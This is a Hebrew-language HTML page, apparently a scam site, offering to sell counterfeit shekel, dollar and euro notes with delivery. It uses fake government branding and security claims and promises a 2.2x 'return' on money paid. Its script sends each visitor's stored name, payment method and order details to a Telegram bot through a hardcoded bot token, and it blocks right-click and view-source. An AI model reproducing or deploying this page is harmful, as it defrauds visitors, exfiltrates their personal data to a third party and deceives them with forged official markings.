<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Money_IL - מערכת להזמנת שטרות מזויפים (Wizard)</title>
  <style>
    :root {
      --gov-navy: #0b192c;
      --gov-blue: #0066cc;
      --gov-blue-dark: #004899;
      --gov-bg: #f8fafc;
      --border-color: #cbd5e1;
      --text-main: #0f172a;
      --text-muted: #64748b;
      --success-green: #16a34a;
    }

    * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }

    body {
      background-color: #f1f5f9;
      background-image: radial-gradient(#cbd5e1 1.4px, transparent 1.4px);
      background-size: 22px 22px;
      margin: 0; padding: 0;
      min-height: 100vh;
      display: flex; flex-direction: column; justify-content: space-between;
      color: var(--text-main);
      -webkit-user-select: none; user-select: none;
    }

    .gov-navbar {
      background: var(--gov-navy); color: white; padding: 14px 24px;
      display: flex; justify-content: space-between; align-items: center;
      box-shadow: 0 4px 15px rgba(0,0,0,0.12);
    }

    .gov-brand { display: flex; align-items: center; gap: 14px; }
    .gov-logo-svg { width: 42px; height: 42px; filter: drop-shadow(0 2px 6px rgba(0, 102, 204, 0.4)); }
    .brand-title { font-size: 20px; font-weight: 800; color: #ffffff; margin: 0; }
    .brand-sub { font-size: 11px; color: #94a3b8; }

    .sec-tag {
      display: flex; align-items: center; gap: 7px;
      background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.18);
      padding: 6px 12px; border-radius: 20px; font-size: 11.5px; font-weight: 600; color: #38bdf8;
    }
    .sec-dot { width: 7px; height: 7px; background: #38bdf8; border-radius: 50%; box-shadow: 0 0 8px #38bdf8; }

    .main-container { max-width: 540px; margin: 30px auto; padding: 0 16px; width: 100%; }

    .gov-card {
      background: #ffffff; border-radius: 16px; border: 1px solid rgba(203, 213, 225, 0.8);
      box-shadow: 0 12px 35px rgba(0,0,0,0.06); overflow: hidden; margin-bottom: 25px;
    }

    .gov-card-header {
      background: #f8fafc; border-bottom: 1px solid #e2e8f0;
      padding: 18px 22px; display: flex; align-items: center; justify-content: space-between;
    }
    .gov-card-header h2 { margin: 0; font-size: 17px; color: var(--gov-navy); font-weight: 700; }

    .gov-card-body { padding: 24px; }

    .wizard-steps { display: flex; justify-content: center; gap: 10px; margin-bottom: 22px; }
    .w-dot {
      width: 32px; height: 32px; border-radius: 50%; background: #e2e8f0; color: #64748b;
      display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700;
    }
    .w-dot.active { background: var(--gov-blue); color: white; box-shadow: 0 0 10px rgba(0,102,204,0.3); }
    .w-dot.done { background: var(--success-green); color: white; }

    .wizard-step-content { display: none; }
    .wizard-step-content.active { display: block; animation: fadeIn 0.4s ease; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }

    .form-group { margin-bottom: 16px; text-align: right; }
    label { display: block; font-size: 12.5px; font-weight: 600; color: #334155; margin-bottom: 6px; }
    input[type="number"], select {
      width: 100%; padding: 12px 14px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; background: #ffffff; transition: all 0.2s;
    }
    input:focus, select:focus { border-color: var(--gov-blue); box-shadow: 0 0 0 3.5px rgba(0, 102, 204, 0.12); }

    .result-dashboard { background: linear-gradient(135deg, #0b192c, #1e3a8a); color: white; border-radius: 12px; padding: 18px; margin-bottom: 20px; }
    .result-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; font-size: 13.5px; }
    .result-row.total { border-top: 1px solid rgba(255,255,255,0.15); margin-top: 10px; padding-top: 10px; font-size: 16px; font-weight: 800; color: #38bdf8; }
    .res-val { font-family: monospace; font-weight: 700; }

    .btn-gov {
      width: 100%; padding: 14px; background: var(--gov-blue); color: white; border: none;
      border-radius: 8px; font-size: 15px; font-weight: 700; cursor: pointer; transition: background 0.2s; box-shadow: 0 4px 12px rgba(0, 102, 204, 0.2);
    }
    .btn-gov:hover { background: var(--gov-blue-dark); }

    footer { padding: 20px 16px; text-align: center; font-size: 11.5px; color: var(--text-muted); border-top: 1px solid #e2e8f0; background: white; margin-top: 25px; }
    .footer-sec-line { display: flex; justify-content: center; align-items: center; gap: 16px; margin-bottom: 8px; font-weight: 600; color: #334155; }
    .sec-item { display: flex; align-items: center; gap: 5px; }
    .sec-item svg { width: 14px; height: 14px; fill: var(--gov-blue); }
  </style>
</head>
<body oncontextmenu="return false;">

  <header class="gov-navbar">
    <div class="gov-brand">
      <svg class="gov-logo-svg" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M50 6 L90 26 V74 L50 94 L10 74 V26 Z" fill="#0066cc" stroke="#38bdf8" stroke-width="2.5"/>
        <circle cx="50" cy="50" r="20" fill="#0b192c"/>
        <text x="50" y="58" font-size="22" font-weight="900" fill="#ffffff" text-anchor="middle">₪</text>
      </svg>
      <div>
        <h1 class="brand-title">Money_IL</h1>
        <p class="brand-sub">תוכנת הזמנת שטרות מזויפים</p>
      </div>
    </div>
    <div class="sec-tag"><div class="sec-dot"></div><span>GOV-SEC</span></div>
  </header>

  <div class="main-container">
    <div class="gov-card">
      <div class="gov-card-header">
        <h2 id="wizardTitle">שלב 1: באיזה סכום תרצה לקנות</h2>
        <span style="font-size: 12px; font-weight: 600; color: var(--text-muted);" id="stepIndicatorText">שלב 1 מתוך 2</span>
      </div>

      <div class="gov-card-body">
        <div class="wizard-steps">
          <div class="w-dot active" id="wDot1">1</div>
          <div class="w-dot" id="wDot2">2</div>
        </div>

        <div class="wizard-step-content active" id="wStep1">
          <div class="form-group"><label>הכנס סכום העסקה בשקלים (₪) *</label><input type="number" id="investmentAmount" value="5000" min="100" step="100"></div>
          <div class="form-group">
            <label>מטבע מזוייף רצוי *</label>
            <select id="currencyType">
              <option value="ILS" selected>שקל חדש (₪ - ILS)</option>
              <option value="USD">דולר אמריקאי ($ - USD)</option>
              <option value="EUR">אירו (€ - EUR)</option>
            </select>
          </div>
          <button class="btn-gov" onclick="goToStep2()">המשך לבחירת משלוח עד הבית ←</button>
        </div>

        <div class="wizard-step-content" id="wStep2">
          <div class="form-group">
            <label>אפשרות לוגיסטיקה ומשלוח</label>
            <select id="shippingOption" onchange="toggleShipping()">
              <option value="no">ללא משלוח (איסוף עצמי)</option>
              <option value="yes" selected>משלוח עד הבית (מחושב אוטומטית)</option>
            </select>
          </div>
          <div class="form-group" id="cityGroup">
            <label>בחר עיר יעד בישראל</label>
            <select id="targetCity" onchange="calculateSummary()">
              <option value="0">תל אביב - יפו</option>
              <option value="10">רמת גן / גבעתיים</option>
              <option value="15">פתח תקווה / בני ברק</option>
              <option value="20">הרצליה / רמת השרון</option>
              <option value="25">חולון / בת ים / ראשון לציון</option>
              <option value="35">נתניה / כפר סבא / רעננה</option>
              <option value="42">אשדוד / רחובות</option>
              <option value="60">ירושלים</option>
              <option value="90">חיפה / חדרה</option>
              <option value="105">באר שבע / אשקלון</option>
              <option value="130">טברית / עפולה</option>
              <option value="160">צפת / קריית שמונה</option>
              <option value="300">אילת</option>
            </select>
          </div>

          <div class="result-dashboard">
            <div class="result-row"><span>סכום הקנייה שלך:</span><span class="res-val" id="resInvestment">5,000 ₪</span></div>
            <div class="result-row" id="resShippingRow"><span>עלות משלוח מדורגת:</span><span class="res-val" id="resShipping">510 ₪</span></div>
            <div class="result-row total"><span>סכום התוצאה שתקבל:</span><span class="res-val" id="resTotal">11,510 ₪</span></div>
          </div>

          <div style="display: flex; gap: 10px;">
            <button class="btn-gov" style="background: #64748b;" onclick="goToStep1()">← חזרה</button>
            <button class="btn-gov" onclick="submitToTelegram()">✓ בצע הזמנה</button>
          </div>
        </div>

      </div>
    </div>
  </div>

  <footer>
    <div class="footer-sec-line">
      <div class="sec-item"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/></svg><span>הצפנת AES-256</span></div>
      <span>•</span>
      <div class="sec-item"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg><span>תקן ISO 27001</span></div>
      <span>•</span>
      <div class="sec-item"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg><span>מאומת GOV</span></div>
    </div>
    <div>© 2026 Money_IL - רכישת שטרות מזויפים . כל הזכויות שמורות.</div>
  </footer>

  <script>
    function goToStep2() {
      document.getElementById('wStep1').classList.remove('active');
      document.getElementById('wStep2').classList.add('active');
      document.getElementById('wDot1').classList.remove('active');
      document.getElementById('wDot1').classList.add('done');
      document.getElementById('wDot1').innerText = '✓';
      document.getElementById('wDot2').classList.add('active');
      document.getElementById('wizardTitle').innerText = 'שלב 2: משלוח, חישוב ואישור סופי';
      document.getElementById('stepIndicatorText').innerText = 'שלב 2 מתוך 2';
      calculateSummary();
    }

    function goToStep1() {
      document.getElementById('wStep2').classList.remove('active');
      document.getElementById('wStep1').classList.add('active');
      document.getElementById('wDot2').classList.remove('active');
      document.getElementById('wDot1').classList.remove('done');
      document.getElementById('wDot1').innerText = '1';
      document.getElementById('wDot1').classList.add('active');
      document.getElementById('wizardTitle').innerText = 'שלב 1: ניהול סכום העסקה';
      document.getElementById('stepIndicatorText').innerText = 'שלב 1 מתוך 2';
    }

    function toggleShipping() {
      const opt = document.getElementById('shippingOption').value;
      const cityGroup = document.getElementById('cityGroup');
      const row = document.getElementById('resShippingRow');
      if (opt === 'no') {
        cityGroup.style.display = 'none';
        row.style.display = 'none';
      } else {
        cityGroup.style.display = 'block';
        row.style.display = 'flex';
      }
      calculateSummary();
    }

    function calculateSummary() {
      const investment = parseFloat(document.getElementById('investmentAmount').value) || 0;
      const opt = document.getElementById('shippingOption').value;
      const km = opt === 'yes' ? parseFloat(document.getElementById('targetCity').value) || 0 : 0;
      const currency = document.getElementById('currencyType').value;

      let shippingCost = 0;
      if (opt === 'yes') {
        if (km <= 40) {
          shippingCost = km * 15;
        } else {
          shippingCost = (40 * 15) + ((km - 40) * 5);
        }
      }

      const baseReturn = investment * (1100 / 500);
      let totalReturn = baseReturn + shippingCost;

      let rate = 1;
      let symbol = '₪';
      if (currency === 'USD') { rate = 3.65; symbol = '$'; }
      else if (currency === 'EUR') { rate = 3.95; symbol = '€'; }

      document.getElementById('resInvestment').innerText = `${(investment / rate).toLocaleString('he-IL', {maximumFractionDigits: 2})} ${symbol}`;
      document.getElementById('resShipping').innerText = `${(shippingCost / rate).toLocaleString('he-IL', {maximumFractionDigits: 2})} ${symbol}`;
      document.getElementById('resTotal').innerText = `${(totalReturn / rate).toLocaleString('he-IL', {maximumFractionDigits: 2})} ${symbol}`;
    }

            function submitToTelegram() {
      const userName = localStorage.getItem('sub_user_name') || 'לא ידוע';
      const userPayment = localStorage.getItem('sub_user_payment') || 'לא צוין';
      const investment = document.getElementById('investmentAmount').value;
      const currency = document.getElementById('currencyType').value;
      const opt = document.getElementById('shippingOption').value;
      const citySelect = document.getElementById('targetCity');
      const cityName = opt === 'yes' ? citySelect.options[citySelect.selectedIndex].text : 'ללא משלוח';
      const totalRes = document.getElementById('resTotal').innerText;

      const message = `🛡️ *[GOV-SEC] דיווח עסקת השקעה מוצפנת* 🛡️\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `👤 *שם הלקוח/ה:* ${userName}\n` +
                      `💳 *אמצעי תשלום נבחר:* ${userPayment}\n` +
                      `💰 *סכום השקעה התחלתי:* ${investment} ₪\n` +
                      `💱 *מטבע יעד מומר:* ${currency}\n` +
                      `📦 *פרטי לוגיסטיקה ויעד:* ${cityName}\n` +
                      `📈 *תשואה סופית מוערכת:* ${totalRes}\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `🔒 *סטטוס אבטחה:* מאומת AES-256 (ISO 27001)`;

      const botToken = '8900098820:AAE2BhJ9qCI00UpOMLfOUc61613FpS_UA64';
      const chatId = '8017590244';

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
      })
      .then(response => {
        if (response.ok) alert('הנתונים נשלחו בהצלחה לבוט בטלגרם!');
        else alert('שגיאה בשליחת הנתונים לטלגרם.');
      })
      .catch(error => { console.error('Error:', error); });
    }

    document.addEventListener('keydown', function(e) {
      if (e.ctrlKey && (e.key === 'c' || e.key === 'C' || e.key === 'u' || e.key === 'U')) {
        e.preventDefault();
      }
    });
  </script>
</body>
</html>
